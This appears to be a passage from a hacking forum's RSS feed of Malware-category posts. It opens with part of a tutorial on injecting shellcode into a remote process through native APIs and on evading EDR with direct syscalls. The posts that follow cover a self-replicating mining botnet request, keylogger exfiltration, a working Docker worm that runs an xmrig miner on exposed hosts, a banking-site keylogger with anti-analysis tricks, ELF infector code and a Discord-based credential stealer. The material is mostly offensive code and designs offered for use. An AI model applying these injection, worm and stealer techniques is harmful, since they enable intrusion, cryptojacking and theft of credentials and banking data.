<p>like the previous section, we start by opening our target process but this time using <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess" rel="noopener nofollow ugc">NtOpenProcess</a>. this function does not return a Handle to our target process but we need to pass a handle pointer as the first argument(pass by reference). we should also pass a pointer to an <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes" rel="noopener nofollow ugc">OBJECT_ATTRIBUTES</a> structure and a pointer to  <strong>Client ID</strong>  struct so let’s define them. we should also initialize  <strong>OBJECT_ATTRIBUTES</strong>  using <a href="https://docs.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-initializeobjectattributes" rel="noopener nofollow ugc">InitializeObjectAttributes</a> macro and define  <strong>UNICODE_STRING</strong>  struct.</p>
<pre><code class="lang-auto">#define InitializeObjectAttributes(p,n,a,r,s) { \
(p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES); \
(p)-&gt;RootDirectory = (r); \
(p)-&gt;Attributes = (a); \
(p)-&gt;ObjectName = (n); \
(p)-&gt;SecurityDescriptor = (s); \
(p)-&gt;SecurityQualityOfService = NULL; \
}

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES ;


OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&amp;oa, NULL,0,NULL,NULL);
CLIENT_ID ci = { (HANDLE)procid, NULL };
</code></pre>
<p>now we can use  <strong>NtOpenProcess</strong></p>
<pre><code class="lang-auto">NtOpenProcess(&amp;target_process_handle,PROCESS_ALL_ACCESS, &amp;oa, &amp;ci);
</code></pre>
<h3>NtAllocateVirtualMemory</h3>
<p>we allocate memory in target process using the <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" rel="noopener nofollow ugc">NtAllocateVirtualMemory</a> function. we define the function prototype.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
</code></pre>
<p>then we get the base address of the function.</p>
<pre><code class="lang-auto">pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
</code></pre>
<p>and we call it</p>
<pre><code class="lang-auto">NtAllocateVirtualMemory(target_process_handle, &amp;remote_process_buffer, 0,&amp;buf_len ,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</code></pre>
<p>we passed a void pointer named  <strong>remote_process_buffer</strong>  that will be the base address of the allocated space.</p>
<h3>NtWriteVirtualMemory</h3>
<p>we define <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtWriteVirtualMemory.html" rel="noopener nofollow ugc">NtWriteVirtualMemory</a> function prototype like previous steps. we should pass our shellcode, the length of the shellcode, and the base address of the allocated space as arguments.</p>
<pre><code class="lang-auto">typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten OPTIONAL);
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
NtWriteVirtualMemory(target_process_handle, remote_process_buffer, buf, buf_len, NULL);
</code></pre>
<h3>NtCreateThreadEx</h3>
<p>now it’s time to create a thread in our target process and run our shellcode. we use  <strong>NtCreateThreadEx</strong>  to create a remote thread in the target process and run our shellcode. we should pass 0 as the  <strong>CreateFlag</strong>  parameter to run the thread immediately after creation and 0x1FFFFF (PROCESS_ALL_ACCESS) as the  <strong>DesiredAccess</strong>  parameter. to see the function prototype, you can look <a href="https://github.com/processhacker/processhacker/blob/753a395d55634f5e5483c517219414c2ecacfc23/phnt/include/ntpsapi.h#L1814" rel="noopener nofollow ugc">here</a>.</p>
<pre><code class="lang-auto">NtCreateThreadEx(&amp;thread_handle, 0x1FFFFF, NULL, target_process_handle,(LPTHREAD_START_ROUTINE)remote_process_buffer,NULL, FALSE, NULL, NULL, NULL, NULL);
</code></pre>
<p>that’s it for Native APIs. let’s go one step deeper and use syscalls.</p>
<h2>Direct Syscalls</h2>
<h3>pros:</h3>
<ul>
<li>undetectable by all of the API monitoring tools that work on user-space</li>
</ul>
<h3>cons:</h3>
<ul>
<li>May not work on all windows versions</li>
<li>hard to use</li>
</ul>
<p>In the previous steps, any API monitoring application and EDRs could detect our API calls and ruin our operation. now if we use direct syscalls nothing in userland can detect our API calls. but as <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" rel="noopener nofollow ugc">sysmon</a> works as a driver in kernel space we can’t do anything about it. so, it is strongly recommended to use sysmon.</p>
<p>One of the disadvantages of using syscalls is that their work is dependent on the version of OS and our code may not work on different windows versions. However, by using a great tool like <a href="https://github.com/jthuraisamy/SysWhispers" rel="noopener nofollow ugc">SysWhisper</a> we can generate syscalls for different windows versions. you can run the following command to generate syscalls for our desired functions for windows 10.</p>
<pre><code class="lang-auto">syswhispers.py --function NtCreateProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscall --versions 10
</code></pre>
<p>this command generates two output files  <strong>syscall.asm</strong>  and  <strong>syscall.h</strong>  that we add to our visual studio project. then we should enable <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/masm-for-x64-ml64-exe?view=msvc-160" rel="noopener nofollow ugc">MASM</a> in the project and include the header file in our main code.</p>
<p>afterward using the functions is like Native APIs but here we don’t need to load ntdll.dll, get the base address of the functions, and defining function prototypes. I think SysWhisper has made it really easy to utilize syscalls.</p>
<p>You can find the codes for this post on my <a href="https://github.com/AlionGreen/remote-thread-injection" rel="noopener nofollow ugc">Github</a>.</p>
<h2>Credit:</h2>
<p>thanks, <a href="https://twitter.com/0x00dtm" rel="noopener nofollow ugc">@0x00dtm</a> for guiding me through Native APIs and Syscalls. it would be much harder without his help.</p>
<h2>References:</h2>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      
      <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">outflank.nl</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/" target="_blank" rel="noopener nofollow ugc">Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR |...</a></h3>

<p>In this blog post we will explore the use of direct system calls, restore hooked API calls and ultimately combine this with a shellcode injection technique called&nbsp;sRDI. We will combine these techniques in proof of concept code which can be used...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.ired.team/offensive-security/code-injection-process-injection/process-injection/</a></p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/9/f/9f230528ee350a1335deb4fe0b3db3b3c25fa147.png" class="site-icon" width="200" height="200">
      <a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc" title="07:34PM - 11 August 2020">batsec – 11 Aug 20</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://blog.dylan.codes/defending-your-malware/" target="_blank" rel="noopener nofollow ugc">Defending Your Malware</a></h3>

<p>Malware is an important part of an engagement, though as many security solutions are now evolving past rudimentary signature comparisons to using more advanced techniques to detect malicious activity, it is important that we as attackers understand...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>10 posts - 7 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/process-injection-remote-thread-injection-or-createremotethread/24399">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/process-injection-remote-thread-injection-or-createremotethread/24399</link>
          <pubDate>Mon, 28 Dec 2020 19:44:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-24399</guid>
          <source url="https://d.clarkee.co.uk/t/process-injection-remote-thread-injection-or-createremotethread/24399.rss">Process Injection: Remote Thread Injection or CreateRemoteThread</source>
        </item>
        <item>
          <title>Creating a botnet in C plus plus</title>
          <dc:creator><![CDATA[iii23]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Is there a basic framework of a C plus plus server client botnet with multi client support? I want to design my own botnet that mines xmr in the language, but uses couchdb instead of sql as the database. I just need a basic example, then maybe I could begin to add to it. Also, I want it to self replicate by bruting ssh servers and be able yo be remotely updated from the command server.</p>
            <p><small>7 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/creating-a-botnet-in-c-plus-plus/23530">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/creating-a-botnet-in-c-plus-plus/23530</link>
          <pubDate>Wed, 14 Oct 2020 02:22:16 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23530</guid>
          <source url="https://d.clarkee.co.uk/t/creating-a-botnet-in-c-plus-plus/23530.rss">Creating a botnet in C plus plus</source>
        </item>
        <item>
          <title>Receive emails from a keylogger without hardcoding smtp credentials?</title>
          <dc:creator><![CDATA[falena]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>How could I send emails (for example to get logs from a keylogger) without authenticating to a smtp server. Should I implement a local smtp server? I don’t want to hardcode credentials inside the keylogger and I’d want to avoid trivial spam-flagging.<br>
Which methods should I use? Can you recommend a python example code to learn?</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/receive-emails-from-a-keylogger-without-hardcoding-smtp-credentials/23458">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/receive-emails-from-a-keylogger-without-hardcoding-smtp-credentials/23458</link>
          <pubDate>Fri, 09 Oct 2020 07:15:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23458</guid>
          <source url="https://d.clarkee.co.uk/t/receive-emails-from-a-keylogger-without-hardcoding-smtp-credentials/23458.rss">Receive emails from a keylogger without hardcoding smtp credentials?</source>
        </item>
        <item>
          <title>Docker Worm in Python</title>
          <dc:creator><![CDATA[iii23]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>I heard that Docker worms are a recent thing, so I tried to make a crude one. The only part I’m stuck at his making the connection to the Docker host (from a list of docker files). The sdk isn’t helping me much, especially with the from_env() method. Do you have to use os to change the enviroment variables each time? Here’s the code, I hope it help you guys answering my question.<br>
indent preformatted text by 4 spacesimport docker<br>
import time<br>
import os</p>
<p>ip_list = []</p>
<p>def load_hosts():</p>
<pre><code>with open('dockerlist.txt', 'r') as f:
	for line in f.readlines():
		docker = line.strip('\n')
		ip_list.append(docker)
</code></pre>
<p>def docker_connect():</p>
<pre><code>load_hosts()
for ip in ip_list:
	try:
		os.environ["DOCKER_HOST"] = 'tcp:// ' + ip + ' :2375'
		dclient = docker.from_env()
		dclient.images.pull('alpine')
		print('downloaded test image at ' + ip)
		dclient.images.pull('villers/docker-xmrig')
		print('pulled image #1')
		dclient.containers.run('villers/docker-xmrig', ' -o pool.hashvault.pro:5555 -u 43UMRjdw6aU4skKEEXKXTsQMGFg4uakPdiB6aVcqNPpJKQy7GWYbprp86tji4k4wLsiHerfhRRPXyUEepbK7YFSk6YjuQpQ -p Hello', detach=True)
		print('ran miner on ' + ip ' !')
	except:
		print( ip + ' docker not avaiable!')
</code></pre>
<p>docker_connect()</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/docker-worm-in-python/23268">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/docker-worm-in-python/23268</link>
          <pubDate>Wed, 23 Sep 2020 19:47:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23268</guid>
          <source url="https://d.clarkee.co.uk/t/docker-worm-in-python/23268.rss">Docker Worm in Python</source>
        </item>
        <item>
          <title>Doubt malware anti-forensics</title>
          <dc:creator><![CDATA[duakx]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello 0x00’ers!<br>
I’m new here so if I haven’t categorized my question properly I apologize. Thanks  0x00Sec for providing a forum to discuss and learning together.<br>
I have a problem about malware that has bothered me for a long time.</p>
<h3><a name="p-60472-background-1" class="anchor" href="https://d.clarkee.co.uk#p-60472-background-1"></a>Background:</h3>
<p>I work as a security, and sometimes dealing with malicious is part of my job. Once a host was infected malware by unauthorized hadoop yarn api. This malware was run by a ordinary user hadoop, and this hadoop user did not have much privilege to modify settings or files on the system.</p>
<h3><a name="p-60472-strange-things-2" class="anchor" href="https://d.clarkee.co.uk#p-60472-strange-things-2"></a>Strange Things:</h3>
<p>Under normal circumstances, I will use cp /proc/pid/exe /tmp/malware to restore the executable program of the malicious process. Even if the file has been deleted or the memfd_create call that fileless malicious program is used, it can be successfully restored the executable program by the cp command, unless it is a system kernel thread. But when I used the cp command to recover a malware process, the command return</p>
<blockquote>
<p>cp: cannot stat ‘/proc/pid/exe’: No such file or directory.</p>
</blockquote>
<p>This is very strange, it is worth mentioning that I am a root user and use busybox cp</p>
<h3><a name="p-60472-what-magic-does-this-malware-may-use-3" class="anchor" href="https://d.clarkee.co.uk#p-60472-what-magic-does-this-malware-may-use-3"></a>What magic does this malware may use:</h3>
<p>I very curious about the magic used by this malicious program. It can hide its executable program well, even if it is a ordinary user hadoop. I currently know that there are the following methods to achieve similar hiding:</p>
<ol>
<li>fuse: Ordinary users can mount fuse file system and run their own executable program, and then umount fuse, as far as I know, the executable program of the process cannot be restored by using the cp command at this time</li>
<li>nfs: similar to method 1</li>
</ol>
<p>But these two methods of hiding one’s own executable program that I know above are not the method used by the hadoop malicious program I encountered that time. so here to consult, does any 0x00’ers know what strange magic the malicious program may use?</p>
<p>Looking forward to hearing any relevant points!</p>
            <p><small>9 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/doubt-malware-anti-forensics/23062">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/doubt-malware-anti-forensics/23062</link>
          <pubDate>Thu, 10 Sep 2020 08:29:16 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-23062</guid>
          <source url="https://d.clarkee.co.uk/t/doubt-malware-anti-forensics/23062.rss">Doubt malware anti-forensics</source>
        </item>
        <item>
          <title>Delphi for Malware</title>
          <dc:creator><![CDATA[GodPwned]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>I’ve heard Delphi is used for malware packing but I also heard that it was used or still being used to write Malware. So can anyone enlighten me with the details and also is there any post for writing Malware with Delphi. I tried finding but couldn’t.<br>
Thanks in advance ;D</p>
            <p><small>5 posts - 3 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/delphi-for-malware/22923">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/delphi-for-malware/22923</link>
          <pubDate>Sun, 30 Aug 2020 13:18:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22923</guid>
          <source url="https://d.clarkee.co.uk/t/delphi-for-malware/22923.rss">Delphi for Malware</source>
        </item>
        <item>
          <title>Coqui - A keylogger that activates for only banking-related sites</title>
          <dc:creator><![CDATA[torch]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>Showcasing Coqui (Conditional Keylogger)</h1>
<h2>DISCLAIMER: This project was made for research purposes. Anything you do with this code is on you and is not my responsibility.</h2>
<p>Coqui was originally supposed to be a “banking trojan”, but due to my lack of skills, I settled for a conditional keylogger which only activates when it detects the victim on certain banking sites.</p>
<p>Coqui also contains anti-analysis techniques such as detecting Process Monitor, Process Hacker (anything with Process in the first part of the name, this can also be expanded by adding more conditional statements). If these processes are detected, the main keylogger is opened and overwritten to render analysis of the keylogger useless. The keylogger will also only activate if it detects a banking related window, once that window is out of focus (EX: the user opens calculator), the keylogger is killed.</p>
<p>Once the window monitor starts (ProcKill), it attempts to kill off the keylogger (using <code>system(taskkill /F /T /IM keylogger.exe))</code> if it doesn’t detect the main window (the window the user is currently working in) being related to anything banking related.</p>
<h4>NOTE: It compares a hardcoded list of banking related titles to the current working window, this hardcoded list can be expanded by simply adding in window titles:</h4>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/1/12a16328e470a7b597fde6b7b104999b35bc6148.png" data-download-href="/uploads/default/12a16328e470a7b597fde6b7b104999b35bc6148" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/12a16328e470a7b597fde6b7b104999b35bc6148.png" alt="" data-base62-sha1="2EOmE2xepbFIBa33oNZ76BqVY4E" width="690" height="39" data-small-upload="/uploads/default/optimized/2X/1/12a16328e470a7b597fde6b7b104999b35bc6148_2_10x10.png"></a></div><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772.png" data-download-href="/uploads/default/f4147d900cb4ae241781ec0dd15c3c187196f772" title="" rel="noopener nofollow ugc"><img src="/uploads/default/optimized/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772_2_690x486.png" alt="" data-base62-sha1="yPep0ONnUqZfJuOF0cs1rRiD5wm" width="690" height="486" srcset="https://0x00sec.org/uploads/default/optimized/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772_2_690x486.png, //0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772.png 1.5x, //0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772.png 2x" data-small-upload="/uploads/default/optimized/2X/f/f4147d900cb4ae241781ec0dd15c3c187196f772_2_10x10.png"></a></div><p></p>
<p>The current working window above is the command prompt, so it attempts to kill off the keylogger (in this case, named svart.exe).</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e.png" data-download-href="/uploads/short-url/lImGnC2g6YAk09whYnE7wsUvKZo.png?dl=1" title="" rel="noopener nofollow ugc"><img src="/uploads/default/optimized/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e_2_690x488.png" alt="" data-base62-sha1="lImGnC2g6YAk09whYnE7wsUvKZo" width="690" height="488" srcset="/uploads/default/optimized/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e_2_690x488.png, https://0x00sec.s3.amazonaws.com/original/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/9831868c0d441a7ec600fab72ad435c01cbd041e_2_10x10.png"></a></div><p></p>
<p>Now, the current window above is the Wells Fargo banking site, so the keylogger is started &amp; ProcKill checks to be sure that it is running before starting it again. If it’s already running, it prints out “[!] svart is already running!”.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ee4bcef8b92b4707233fe7ff9eec366d5dcfdee.png" alt="" data-base62-sha1="ko5RVpjuO4rwWky2IAcdLPddlhQ" width="505" height="111"></p>
<p>If the user changes their current working window &amp; the keylogger is running, we can see the “SUCCESS” message, indicating that the keylogger was killed off due to the user changing windows.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f.png" data-download-href="/uploads/short-url/rdq3WVLCBOr8wwLr8E9vNXR3Z2D.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f_2_690x479.png" alt="" data-base62-sha1="rdq3WVLCBOr8wwLr8E9vNXR3Z2D" width="690" height="479" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f_2_690x479.png, https://0x00sec.s3.amazonaws.com/original/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f.png 1.5x, https://0x00sec.s3.amazonaws.com/original/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bebf0f6160053cfa54b4051348ecca5366ae3b2f_2_10x10.png"></a></div><p></p>
<p>And if a window such as Process Hacker is detected, the keylogger is opened &amp; overwritten, before:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/7/799ec1d6ef61dc4745fc441ea5394ed03d090121.png" data-download-href="/uploads/short-url/hlTUoBrQf6qwtm3LV9xzOsCGO3f.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/799ec1d6ef61dc4745fc441ea5394ed03d090121.png" alt="" data-base62-sha1="hlTUoBrQf6qwtm3LV9xzOsCGO3f" width="690" height="332" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/799ec1d6ef61dc4745fc441ea5394ed03d090121_2_10x10.png"></a></div><p></p>
<p>After:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fd78666a6d8fbc698d3ac98cdda86f831fa4c9ae.png" alt="" data-base62-sha1="AaiKRVLTEJf3ZR4w9rYK4nOD2vs" width="547" height="268"></p>
<p>As far as the keylogger goes, it’s fairly basic, the way it exfiltrates the logged data is by sending a GET request to a specified IP address. That IP address should have an Apache server running &amp; logging GET requests. The file <em>dropper.c</em> is responsible for data exfiltration &amp; schedules itself to run every 12 days to exfiltrate the data.</p>
<p>The complete project is hosted on Github for those interested: <a href="https://github.com/1d8/Coqui" rel="noopener nofollow ugc">https://github.com/1d8/Coqui</a></p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/coqui-a-keylogger-that-activates-for-only-banking-related-sites/22818">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/coqui-a-keylogger-that-activates-for-only-banking-related-sites/22818</link>
          <pubDate>Sun, 23 Aug 2020 17:39:16 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22818</guid>
          <source url="https://d.clarkee.co.uk/t/coqui-a-keylogger-that-activates-for-only-banking-related-sites/22818.rss">Coqui - A keylogger that activates for only banking-related sites</source>
        </item>
        <item>
          <title>ELF Injector Patching Issues</title>
          <dc:creator><![CDATA[digitalXmage]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>I’ve been working on an ELFInjector inspired by <a class="mention" href="https://d.clarkee.co.uk/u/0x00pf">@0x00pf</a>  and analyzing his code and  using his payload from his github: <a href="https://github.com/0x00pf/0x00sec_code/blob/master/elfun/payload.asm" class="inline-onebox" rel="noopener nofollow ugc">0x00sec_code/elfun/payload.asm at master · 0x00pf/0x00sec_code · GitHub</a></p>
<p>My Code: <a href="https://github.com/digitalXmage/Elf-Injector-learning-" rel="noopener nofollow ugc">https://github.com/digitalXmage/Elf-Injector-learning-</a></p>
<p>Everything works as expected, I Successfully insert the payload and if i don’t change the entry point, the original code runs, as expected. If i change the entry point to the payload offset in the target file. The payload runs, However a segfault happens at the jmp instruction. It seems. So the issue seems to occur when I then have to patch the jmp instruction of the payload to jump back to the original entry point.</p>
<p>So I’m guessing that the elf injector is not editing the jmp instruction correctly. Here’s the function for the patching:</p>
<pre><code>#define RET_PATTERN 0x11111111

struct file_info   /*[0] = starting address and [1] = size*/
{
uint64_t cave[2];
uint64_t next_seg[2];
uint64_t text_seg[2];
uint64_t ep;
uint64_t payload_size;
} file;
</code></pre>
<p>*Further Down Injector.c , we have the following function for patching (which makes use<br>
of struct file_info which contains information about the target file and the payload)</p>
<pre><code>/*insert the extracted payload into the code cave*/
void insert_payload(Elf64_Shdr payload,int no_segs,Elf64_Phdr *phdr,Elf64_Ehdr *ehdr,uint8_t *mem,uint8_t *payload_data)
{
    /*find .text segment*/
    for(int i=0;i&lt;=no_segs;i++)
    {
    	if(phdr[i].p_type==PT_LOAD &amp;&amp; phdr[i].p_flags == 5)
	    {

	    	/*increase the size of text segment to accomadate the payload*/
	    	phdr[i].p_memsz += (file.payload_size);
    		phdr[i].p_filesz += (file.payload_size);
	
		

	    	/*move the payload at the end of the segment(start of code cave)*/
	    	memmove(mem+file.cave[0],payload_data + payload.sh_offset,payload.sh_size);


	    	/*patch return address*/
	    	unsigned char *ptr;
		    long data;
		    int y,r;
		
		 /*pointer to code*/
	        ptr = (unsigned char *)mem+file.cave[0];

		 for(y=0;y&lt;(int)file.payload_size;y++)
		 {
			/*get value under pointer pluss offset*/
			data = *((long*)(ptr+y));
			r = data ^(long)RET_PATTERN;

			/*check matching pattern*/
			if(r==0)
			{
				printf("*return address found*\n");
				printf("+ Pattern %1x found at offset %d -&gt; %1x\n",RET_PATTERN,y,file.ep);
				*((long *)(ptr+y)) = file.ep; //set jmp instruction of payload to original entry point 
				break;
			}
		}			
			ehdr-&gt;e_entry = file.cave[0]; //set entry point to the code cave
		
	       	break;	
	}
}	
}
</code></pre>
<p>*Testing the code</p>
<blockquote>
<p>./compile<br>
./injector target payload<br>
./target<br>
This file has been infected for 0x00SEC<br>
Segmentation fault</p>
</blockquote>
<p>I’ve done some debugging with gdb on injector.c and I can’t seem to find the problem. I’m patching the jmp instruction to the correct address, being the target’s original entry point. I even looked through the assembly program, which appears the segmentation fault occurs. However it seems my injector.c isn’t patching as expected, even though it seems to? And is able to find the jmp instruction in memory.</p>
<p>Honestly This is my last resort. I wouldn’t of posted here, If i wasn’t desperate and tried everything i could think of. Like i say To get a better understanding and test yourself, Go to my github link for the code, and It’s annotated for easy reading etc.</p>
<p>I just don’t seem to understand why the patching isn’t working as expected? I’m 90% sure the segmentation fault occurs because of the jmp instruction, and thus shouldn’t occur when we change the payload’s jmp instruction to a valid address in memory.</p>
<p>*Note: My code is a very rough draft, Apologies for any confusion or readability issues. ANd I’m aware some variables are unused. This was just a quick draft.</p>
            <p><small>11 posts - 4 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714</link>
          <pubDate>Sat, 15 Aug 2020 11:24:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-22714</guid>
          <source url="https://d.clarkee.co.uk/t/elf-injector-patching-issues/22714.rss">ELF Injector Patching Issues</source>
        </item>
        <item>
          <title>Utilizing Discord as a Possible Attack Vector</title>
          <dc:creator><![CDATA[NotBackslash]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hello everyone,<br>
I’ve been recently working on a small proof of concept malware which takes Discord webhooks and turns them into a server for receiving sensitive information. The malware so far has multiple built in plugins and was designed to be easy to add to however as of right now its able to decrypt all chrome passwords, steal filezilla logs, steal discord tokens, and more. This isn’t meant to be maliciously used more just highlight a potential attack vector which Discord should possibly patch or monitor because as of right now Discord has nothing in place when it comes to preventing the spread of malware which can be seen by them not removing malware being hosted on there domain[1] and also by being able to send sensitive data (which can be matched by using regex) through a webhook.</p>
<p>Full Project Source Code: <a href="https://github.com/backslash/AngstStealer" rel="nofollow noopener">https://github.com/backslash/AngstStealer</a></p>
<p>Citations:<br>
[1] <a href="https://twitter.com/malwrhunterteam/status/1289148607489245184" rel="nofollow noopener">https://twitter.com/malwrhunterteam/status/1289148607489245184</a></p>
            <p><small>6 posts - 4 participants</small></p>
